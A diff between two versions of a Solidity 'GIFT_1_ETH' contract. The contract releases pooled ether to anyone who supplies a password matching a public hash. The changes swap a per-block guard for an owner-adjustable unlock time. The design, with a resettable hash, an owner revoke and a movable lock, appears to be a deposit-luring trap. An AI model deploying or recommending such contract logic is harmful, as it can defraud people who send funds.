@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x6594ac0a2ba54885ff7d314eb27c9694cb25698b
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_1_ETH at 0x34bc4f174c027a68f94a7ea6a3b4930e0211b19d
 */
 pragma solidity ^0.4.19;
 
@@ -7,13 +7,13 @@ contract GIFT_1_ETH
 {
     bytes32 public hashPass;
     
+    bool closed = false;
+    
     address sender;
-	
-	bool passHasBeenSet = false;
-	
-	uint lastBlock;
-	
-	function() public payable{}
+ 
+    uint unlockTime;
+ 
+    function() public payable{}
     
     function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
     
@@ -21,18 +21,27 @@ contract GIFT_1_ETH
     public
     payable
     {
-        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
         {
             hashPass = hash;
             sender = msg.sender;
+            unlockTime = now;
         }
-        lastBlock = block.number;
+    }
+    
+    function SetGiftTime(uint date)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            unlockTime = date;
+        }
     }
     
     function GetGift(bytes pass)
     external
     payable
-    oneforblock
+    canOpen
     {
         if(hashPass == keccak256(pass))
         {
@@ -43,7 +52,7 @@ contract GIFT_1_ETH
     function Revoce()
     public
     payable
-    oneforblock
+    canOpen
     {
         if(msg.sender==sender)
         {
@@ -56,13 +65,13 @@ contract GIFT_1_ETH
     {
         if(msg.sender==sender&&hash==hashPass)
         {
-           passHasBeenSet=true;
+           closed=true;
         }
     }
     
-    modifier oneforblock
+    modifier canOpen
     {
-        require(lastBlock<block.number);
+        require(now>unlockTime);
         _;
     }
     
